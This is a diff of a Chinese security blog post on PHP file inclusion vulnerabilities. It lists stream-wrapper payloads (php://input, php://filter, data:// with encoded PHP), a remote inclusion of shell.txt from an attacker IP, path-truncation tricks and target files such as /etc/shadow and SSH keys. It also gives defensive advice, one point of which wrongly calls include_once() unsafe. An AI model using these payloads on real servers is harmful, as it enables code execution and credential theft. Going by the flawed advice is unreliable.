+<li>phar://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于处理 PHP 归档文件，通常用于包含 PHP 库和资源。</strong></li>
+<li>用于处理 PHP 归档文件，通常用于包含 PHP 库和资源。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>ssh2://****:</strong></li>
+<li>ssh2://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于 SSH2 协议，可用于安全的 Shell 访问和文件传输。</strong></li>
+<li>用于 SSH2 协议，可用于安全的 Shell 访问和文件传输。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>rar://****:</strong></li>
+<li>rar://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于处理 RAR 文件。</strong></li>
+<li>用于处理 RAR 文件。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>ogg://****:</strong></li>
+<li>ogg://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于处理音频流，特别是 Ogg Vorbis 音频文件。</strong></li>
+<li>用于处理音频流，特别是 Ogg Vorbis 音频文件。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>expect://****:</strong></li>
+<li>expect://:</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>用于处理交互式流，通常用于自动化脚本。</strong></li>
+<li>用于处理交互式流，通常用于自动化脚本。</li>
 </ul>
 </li>
-<li></li>
 <li>
 <h3 id="phpini设置"><a class="markdownIt-Anchor" href="#phpini设置">#</a> php.ini 设置</h3>
-</li>
-<li>
-<p><strong>allow_url_fopen 和 allow_url_include 是 PHP 配置选项，用于控制是否允许在代码中访问远程资源和包含远程文件。这两个选项与安全性有关，因为它们可以影响应用程序的安全性。下面分别介绍这两个选项：</strong></p>
-</li>
-<li>
+<p>allow_url_fopen 和 allow_url_include 是 PHP 配置选项，用于控制是否允许在代码中访问远程资源和包含远程文件。这两个选项与安全性有关，因为它们可以影响应用程序的安全性。下面分别介绍这两个选项：</p>
 <ol>
-<li><strong>allow_url_fopen</strong>**😗*</li>
+<li>allow_url_fopen:</li>
 </ol>
-</li>
-<li>
 <ul>
 <li>
 <ul>
-<li><strong>allow_url_fopen</strong> <strong>是一个 PHP 配置选项，用于控制是否允许通过 ****fopen ()</strong> <strong>函数或其他文件处理函数来访问远程资源。如果这个选项被启用（设置为</strong> <strong>1</strong>**），PHP 允许在代码中使用类似 ** <strong>fopen(“<a href="http://example.com/resource">http://example.com/resource</a>”, “r”)</strong> <strong>的方式打开远程 URL，并读取它们的内容。如果禁用（设置为</strong> <strong>0</strong>**），PHP 将不允许这样的操作。**</li>
-<li><strong>需要小心，因为启用</strong> <strong>allow_url_fopen</strong> <strong>可能会导致安全风险，特别是在处理用户提供的 URL 时。攻击者可能尝试包含恶意远程文件或执行恶意代码，从而引发安全问题。</strong></li>
+<li>allow_url_fopen 是一个 PHP 配置选项，用于控制是否允许通过 fopen () 函数或其他文件处理函数来访问远程资源。如果这个选项被启用（设置为 1），PHP 允许在代码中使用类似 fopen (“<a href="http://example.com/resource">http://example.com/resource</a>”, “r”) 的方式打开远程 URL，并读取它们的内容。如果禁用（设置为 0），PHP 将不允许这样的操作。</li>
+<li>需要小心，因为启用 allow_url_fopen 可能会导致安全风险，特别是在处理用户提供的 URL 时。攻击者可能尝试包含恶意远程文件或执行恶意代码，从而引发安全问题。</li>
 </ul>
 </li>
 </ul>
-</li>
-<li>
 <ol>
-<li><strong>allow_url_include</strong>**😗*</li>
+<li>allow_url_include:</li>
 </ol>
-</li>
-<li>
 <ul>
 <li>
 <ul>
-<li><strong>allow_url_include</strong> <strong>是另一个 PHP 配置选项，它控制是否允许通过 ****include</strong> <strong>和</strong> <strong>require</strong> <strong>函数包含远程文件，如</strong> <strong>include “<a href="http://example.com/malicious.php">http://example.com/malicious.php</a>”;****。如果启用（设置为</strong> <strong>1</strong>**），PHP 允许包含远程文件。如果禁用（设置为 ** <strong>0</strong>**），PHP 将不允许包含远程文件。**</li>
-<li><strong>启用 allow_url_include 可能会引发安全风险，因为攻击者可以尝试包含远程恶意代码。</strong></li>
+<li>allow_url_include 是另一个 PHP 配置选项，它控制是否允许通过 include 和 require 函数包含远程文件，如 include “<a href="http://example.com/malicious.php">http://example.com/malicious.php</a>”;。如果启用（设置为 1），PHP 允许包含远程文件。如果禁用（设置为 0），PHP 将不允许包含远程文件。</li>
+<li>启用 allow_url_include 可能会引发安全风险，因为攻击者可以尝试包含远程恶意代码.</li>
 </ul>
 </li>
 <li>
 <p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/12.png" alt=""></p>
-</li>
-<li></li>
-<li>
 <h3 id="协议用法"><a class="markdownIt-Anchor" href="#协议用法">#</a> 协议用法</h3>
-</li>
-<li>
 <h4 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput">#</a> php://input</h4>
-</li>
-<li>
 <ol>
-<li><strong>php.ini 条件是 allow_url_fopen =ON allow_url_include=ON</strong></li>
-<li><strong>遇到 file_get_contents () 要想到用 php://input 绕过</strong></li>
-<li><strong>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。</strong></li>
-<li><strong>比如写<?php phpinfo();?> 或者写一句话？file=php://input POST: 需要写入的数据</strong></li>
-<li><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/13.png" alt=""></li>
+<li>php.ini 条件是 allow_url_fopen =ON allow_url_include=ON</li>
+<li>遇到 file_get_contents () 要想到用 php://input 绕过</li>
+<li>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。</li>
+<li>比如写<?php phpinfo();?> 或者写一句话？file=php://input POST: 需要写入的数据</li>
 </ol>
-</li>
-<li>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/13.png" alt=""></p>
 <h4 id="phpfile"><a class="markdownIt-Anchor" href="#phpfile">#</a> php://file</h4>
-</li>
-<li>
 <ol>
-<li><strong>用它来本地包含读取本地敏感文件比如 file:///etc/passwd</strong></li>
-<li><strong>读取相对路径 php?file=…/…/php.ini</strong></li>
+<li>用它来本地包含读取本地敏感文件比如 file:///etc/passwd</li>
+<li>读取相对路径 php?file=…/…/php.ini</li>
 </ol>
-</li>
-<li>
 <h4 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter">#</a> php://filter</h4>
-</li>
-<li>
 <ol>
-<li><strong>php://filter/convert.base64-encode/resource = 文件路径 base64 读取读取后 base 解码得到源码</strong></li>
-<li><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/14.png" alt=""></li>
-<li><strong>解码得到 admin password</strong></li>
-</ol>
+<li>
+<p>php://filter/convert.base64-encode/resource = 文件路径 base64 读取读取后 base 解码得到源码</p>
 </li>
 <li>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/14.png" alt=""></p>
+</li>
+<li>
+<p>解码得到 admin password</p>
+</li>
+</ol>
 <h4 id="zip"><a class="markdownIt-Anchor" href="#zip">#</a> zip://</h4>
-</li>
-<li>
 <ol>
-<li><strong>用于访问对应的压缩文件子文件但是要绝对路径 zip 文件跟子文件要用# %23 分割， 只需要是 zip 的压缩包即可，后缀名可以任意更改</strong></li>
-<li><strong>相同的类型还有 zlib:// 和 bzip2://</strong></li>
-<li><strong>利用 page=zip://D:\Everydaytools\phpstudy_pro\WWW\www.dvwa.com\vulnerabilities\123.zip%23123.txt</strong></li>
-<li><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/15.png" alt=""></li>
-<li><strong>得到 123.zip 里面的 123.txt</strong></li>
-</ol>
+<li>
+<p>用于访问对应的压缩文件子文件但是要绝对路径 zip 文件跟子文件要用# %23 分割， 只需要是 zip 的压缩包即可，后缀名可以任意更改</p>
 </li>
 <li>
+<p>相同的类型还有 zlib:// 和 bzip2://</p>
+</li>
+<li>
+<p>利用 page=zip://D:\Everydaytools\phpstudy_pro\WWW\www.dvwa.com\vulnerabilities\123.zip%23123.txt</p>
+</li>
+<li>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/15.png" alt=""></p>
+</li>
+<li>
+<p>得到 123.zip 里面的 123.txt</p>
+</li>
+</ol>
 <h4 id="data协议"><a class="markdownIt-Anchor" href="#data协议">#</a> data:// 协议</h4>
-</li>
-<li>
 <ol>
-<li><strong>类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</strong></li>
-<li><strong>?page=data://text/plain,<?php phpinfo();?>或者用 baes64 编码后？page=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+</strong></li>
-<li><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/16.png" alt=""></li>
-</ol>
-</li>
-<li></li>
-<li></li>
 <li>
+<p>类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</p>
+</li>
+<li>
+<p>?page=data://text/plain,<?php phpinfo();?>或者用 baes64 编码后？page=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+</p>
+</li>
+<li>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/16.png" alt=""></p>
+</li>
+</ol>
 <h3 id="文件包含常用路径"><a class="markdownIt-Anchor" href="#文件包含常用路径">#</a> 文件包含常用路径</h3>
-</li>
-<li>
 <h4 id="日志文件"><a class="markdownIt-Anchor" href="#日志文件">#</a> 日志文件</h4>
-</li>
-<li>
 <ol>
-<li><strong>/usr/local/apache2/logs/access_log</strong></li>
-<li><strong>/logs/access_log</strong></li>
-<li><strong>/etc/httpd/logs/access_log</strong></li>
-<li><strong>/var/log/httpd/access_log</strong></li>
-<li><strong>/var/log/nginx/access.log</strong></li>
-<li><strong>/var/log/nginx/error.log</strong></li>
-<li><strong>$CATALINA_BASE/logs/access_log</strong></li>
-<li><strong>$CATALINA_BASE/logs/catalina.out</strong></li>
+<li>/usr/local/apache2/logs/access_log</li>
+<li>/logs/access_log</li>
+<li>/etc/httpd/logs/access_log</li>
+<li>/var/log/httpd/access_log</li>
+<li>/var/log/nginx/access.log</li>
+<li>/var/log/nginx/error.log</li>
+<li>$CATALINA_BASE/logs/access_log</li>
+<li>$CATALINA_BASE/logs/catalina.out</li>
 </ol>
-</li>
-<li>
 <h4 id="网站配置文件"><a class="markdownIt-Anchor" href="#网站配置文件">#</a> 网站配置文件</h4>
-</li>
-<li>
 <ol>
-<li><strong>dedecms-- data/common.inc.php,</strong></li>
-<li><strong>discuz 全–config/config_global.php,</strong></li>
-<li><strong>phpcms–caches/configs/database.php</strong></li>
-<li><strong>phpwind- -conf/database.php</strong></li>
-<li><strong>wordpress-- wp-config.php</strong></li>
+<li>dedecms-- data/common.inc.php,</li>
+<li>discuz 全–config/config_global.php,</li>
+<li>phpcms–caches/configs/database.php</li>
+<li>phpwind- -conf/database.php</li>
+<li>wordpress-- wp-config.php</li>
 </ol>
-</li>
-<li>
 <h4 id="系统配置文件"><a class="markdownIt-Anchor" href="#系统配置文件">#</a> 系统配置文件</h4>
-</li>
-<li>
-<p><strong>linux</strong></p>
-</li>
-<li>
-<p><strong>/root/.ssh/authorized_keys</strong></p>
-</li>
-<li>
-<p><strong>/root/.ssh/id_rsa</strong></p>
-</li>
-<li>
-<p><strong>/root/.ssh/id_ras.keystore</strong></p>
-</li>
-<li>
-<p><strong>/root/.ssh/known_hosts</strong></p>
-</li>
-<li>
-<p><strong>/etc/passwd</strong></p>
-</li>
-<li>
-<p><strong>/etc/shadow</strong></p>
-</li>
-<li>
-<p><strong>/etc/my.cnf</strong></p>
-</li>
-<li>
-<p><strong>/etc/httpd/conf/httpd.conf</strong></p>
-</li>
-<li>
-<p><strong>/root/.bash_history</strong></p>
-</li>
-<li>
-<p><strong>/root/.mysql_history</strong></p>
-</li>
-<li>
-<p><strong>/proc/self/fd/fd [0-9]*(文件标识符)</strong></p>
-</li>
-<li>
-<p><strong>/proc/mounts</strong></p>
-</li>
-<li>
-<p><strong>/porc/config.gz</strong></p>
-</li>
-<li>
-<p><strong>win</strong></p>
-</li>
-<li>
-<p><strong>C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置</strong></p>
-</li>
-<li>
-<p><strong>C:/Windows/repairsam// 初次安装的密码</strong></p>
-</li>
-<li>
-<p><strong>C:/Program Files/mysql/my.ini//Mysql 配置</strong></p>
-</li>
-<li>
-<p><strong>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</strong></p>
-</li>
-<li>
-<p><strong>C:/Windows/php.ini//php 配置</strong></p>
-</li>
-<li>
-<p><strong>C:/Windows/my.ini//Mysql 配置</strong></p>
+<p>linux</p>
+<p>/root/.ssh/authorized_keys</p>
+<p>/root/.ssh/id_rsa</p>
+<p>/root/.ssh/id_ras.keystore</p>
+<p>/root/.ssh/known_hosts</p>
+<p>/etc/passwd</p>
+<p>/etc/shadow</p>
+<p>/etc/my.cnf</p>
+<p>/etc/httpd/conf/httpd.conf</p>
+<p>/root/.bash_history</p>
+<p>/root/.mysql_history</p>
+<p>/proc/self/fd/fd [0-9]*(文件标识符)</p>
+<p>/proc/mounts</p>
+<p>/porc/config.gz</p>
+<p>win</p>
+<p>C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置</p>
+<p>C:/Windows/repairsam// 初次安装的密码</p>
+<p>C:/Program Files/mysql/my.ini//Mysql 配置</p>
+<p>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</p>
+<p>C:/Windows/php.ini//php 配置</p>
+<p>C:/Windows/my.ini//Mysql 配置</p>
 </li>
 </ul>
 </li>
 </ul>
-<h3 id="远程文件包含"><a class="markdownIt-Anchor" href="#远程文件包含">#</a> <strong>远程文件包含</strong></h3>
+<h3 id="远程文件包含"><a class="markdownIt-Anchor" href="#远程文件包含">#</a> 远程文件包含</h3>
 <ol>
-<li><strong>当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On allow_url_include=ON 两个条件同时为 On 允许远程包含文件。</strong></li>
-<li><a target="_blank" rel="noopener" href="http://192.168.0.103/lfi.php?file=http://192.168.0.103/shell.txt"><strong>http://192.168.0.103/lfi.php?file=http://xxx.xxx.xxx.xxx/shell.txt</strong></a> <strong>xxx.xxx.xxx.xxx 设置为远程的 ip</strong></li>
+<li>当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On allow_url_include=ON 两个条件同时为 On 允许远程包含文件。</li>
+<li><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xMDMvbGZpLnBocD9maWxlPWh0dHA6Ly8xOTIuMTY4LjAuMTAzL3NoZWxsLnR4dA==">http://192.168.0.103/lfi.php?file=http://xxx.xxx.xxx.xxx/shell.txt</span> xxx.xxx.xxx.xxx 设置为远程的 ip</li>
 </ol>
 <h3 id="文件包含截断"><a class="markdownIt-Anchor" href="#文件包含截断">#</a> 文件包含截断</h3>
 <h4 id="00截断"><a class="markdownIt-Anchor" href="#00截断">#</a> %00 截断</h4>
 <ol>
-<li><strong>php 版本要低于 5.3.4 使用 include 等文件包含函数，可以截断文件名，但是会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成 \0 截断会失败。</strong></li>
+<li>php 版本要低于 5.3.4 使用 include 等文件包含函数，可以截断文件名，但是会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成 \0 截断会失败。</li>
 </ol>
 <h4 id="超长文件包含截断"><a class="markdownIt-Anchor" href="#超长文件包含截断">#</a> 超长文件包含截断</h4>
 <ol>
-<li><strong>合适于 win32 可以使用。进行截断 和 .(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256) 利用操作系统对目录最大长度限制。在 window 下 256 字节 linux 下 4096 字节</strong></li>
+<li>合适于 win32 可以使用。进行截断 和 .(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256) 利用操作系统对目录最大长度限制。在 window 下 256 字节 linux 下 4096 字节</li>
 </ol>
 <h4 id="点截断"><a class="markdownIt-Anchor" href="#点截断">#</a> 点截断</h4>
 <ol>
-<li><strong>php?file=x.jpg…</strong></li>
+<li>php?file=x.jpg…</li>
 </ol>
 <h4 id="截断"><a class="markdownIt-Anchor" href="#截断">#</a> /. 截断</h4>
 <ol>
-<li><strong>php?file=shell.png%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</strong></li>
+<li>php?file=shell.png%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</li>
 </ol>
 <h4 id="远程包含截断"><a class="markdownIt-Anchor" href="#远程包含截断">#</a> 远程包含截断</h4>
 <ol>
-<li><strong>?url=%3f</strong></li>
-<li><strong>00url=%00</strong></li>
-<li><strong>#url=%23</strong></li>
+<li>?url=%3f</li>
+<li>00url=%00</li>
+<li>#url=%23</li>
 </ol>
 <h3 id="防御"><a class="markdownIt-Anchor" href="#防御">#</a> 防御</h3>
 <ol>
-<li><strong>输入验证和过滤：</strong></li>
+<li>输入验证和过滤：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>对用户提供的输入进行验证和过滤，确保用户输入不包含恶意数据。</strong></li>
-<li><strong>使用白名单控制，只允许应用程序需要的文件和目录被包含。</strong></li>
+<li>对用户提供的输入进行验证和过滤，确保用户输入不包含恶意数据。</li>
+<li>使用白名单控制，只允许应用程序需要的文件和目录被包含。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>使用白名单控制：</strong></li>
+<li>使用白名单控制：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>确保只有可信的文件和目录被包含。不要从用户提供的数据中构建文件路径。</strong></li>
-<li><strong>限制包含文件的目录，只允许访问应用程序需要的文件和目录。</strong></li>
+<li>确保只有可信的文件和目录被包含。不要从用户提供的数据中构建文件路径。</li>
+<li>限制包含文件的目录，只允许访问应用程序需要的文件和目录。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>避免直接用户输入：</strong></li>
+<li>避免直接用户输入：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>不要直接将用户输入用作包含文件的路径。如果必须使用用户提供的输入，确保对其进行严格的过滤和验证。</strong></li>
-<li><strong>使用安全的文件包含函数，如<strong><strong> include ()<strong><strong> 和</strong></strong> require ()</strong></strong>，而不是不安全的函数，如<strong><strong> include_once ()<strong><strong> 和</strong></strong> require_once ()</strong></strong>。</strong></li>
+<li>不要直接将用户输入用作包含文件的路径。如果必须使用用户提供的输入，确保对其进行严格的过滤和验证。</li>
+<li>使用安全的文件包含函数，如 include () 和 require ()，而不是不安全的函数，如 include_once () 和 require_once ()。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>文件权限：</strong></li>
+<li>文件权限：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>设置适当的文件和目录权限，以确保只有授权的用户可以访问和执行文件。</strong></li>
-<li><strong>避免将敏感文件放在 Web 根目录下，以减少可能的攻击面。</strong></li>
+<li>设置适当的文件和目录权限，以确保只有授权的用户可以访问和执行文件。</li>
+<li>避免将敏感文件放在 Web 根目录下，以减少可能的攻击面。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>配置安全：</strong></li>
+<li>配置安全：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>配置 Web 服务器和应用程序框架以最小化攻击面。</strong></li>
-<li><strong>禁用不必要的文件包含功能，如<strong><strong> allow_url_fopen</strong></strong> 和<strong><strong> allow_url_include</strong></strong>，以防止包含远程文件。</strong></li>
+<li>配置 Web 服务器和应用程序框架以最小化攻击面。</li>
+<li>禁用不必要的文件包含功能，如 allow_url_fopen 和 allow_url_include，以防止包含远程文件。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>监控和日志：</strong></li>
+<li>监控和日志：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>实施监控和日志功能，以及时检测和响应潜在的文件包含攻击。</strong></li>
+<li>实施监控和日志功能，以及时检测和响应潜在的文件包含攻击。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>安全开发实践：</strong></li>
+<li>安全开发实践：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>培训开发人员，使他们了解文件包含漏洞和其他常见 Web 应用程序漏洞。</strong></li>
-<li><strong>使用安全编程技术，如输出编码和防止 SQL 注入，以加强应用程序的整体安全性。</strong></li>
+<li>培训开发人员，使他们了解文件包含漏洞和其他常见 Web 应用程序漏洞。</li>
+<li>使用安全编程技术，如输出编码和防止 SQL 注入，以加强应用程序的整体安全性。</li>
 </ul>
 </li>
 </ul>
 <ol>
-<li><strong>安全扫描：</strong></li>
+<li>安全扫描：</li>
 </ol>
 <ul>
 <li>
 <ul>
-<li><strong>定期进行安全扫描和渗透测试，以识别和修复文件包含漏洞以及其他潜在的漏洞。</strong></li>
+<li>定期进行安全扫描和渗透测试，以识别和修复文件包含漏洞以及其他潜在的漏洞。</li>
 </ul>
 </li>
 </ul>
-<p><strong>综上所述，文件包含漏洞的防御需要综合使用多种方法，包括输入验证、白名单控制、文件权限管理、安全配置和教育开发人员等措施。这些措施有助于降低文件包含漏洞对应用程序的风险。</strong></p>
-</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2023-10-30 22:56:52" itemprop="dateModified" datetime="2023-10-30T22:56:52+08:00">2023-10-30</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/assets/wechatpay.png" alt="云逸 微信支付"/><p>微信支付</p></div><div><img data-src="/assets/alipay.png" alt="云逸 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>云逸<i class="ic i-at"><em>@</em></i>云逸'bolg</li><li class="link"><strong>本文链接：</strong><a href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="文件包含漏洞">http://example.com/2023/10/30/漏洞/文件包含漏洞/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;tuchuang-1309689803.cos.ap-nanjing.myqcloud.com&#x2F;gyzero&#x2F;tt.jpg" title="域环境"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>内网安全</span><h3>域环境</h3></a></div><div class="item right"></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text"> 常见文件包含函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text"> 文件包含漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cgetshell"><span class="toc-number">4.</span> <span class="toc-text"> 包含日志文件进行 getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshell"><span class="toc-number">5.</span> <span class="toc-text"> 配合文件上传漏洞 getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text"> 伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpini%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.</span> <span class="toc-text"> php.ini 设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95"><span class="toc-number">8.</span> <span class="toc-text"> 协议用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpinput"><span class="toc-number">8.1.</span> <span class="toc-text"> php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpfile"><span class="toc-number">8.2.</span> <span class="toc-text"> php:&#x2F;&#x2F;file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpfilter"><span class="toc-number">8.3.</span> <span class="toc-text"> php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-number">8.4.</span> <span class="toc-text"> zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.5.</span> <span class="toc-text"> data:&#x2F;&#x2F; 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">9.</span> <span class="toc-text"> 文件包含常用路径</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.</span> <span class="toc-text"> 日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">9.2.</span> <span class="toc-text"> 网站配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">9.3.</span> <span class="toc-text"> 系统配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">10.</span> <span class="toc-text"> 远程文件包含</span></a></li><li class="toc-item 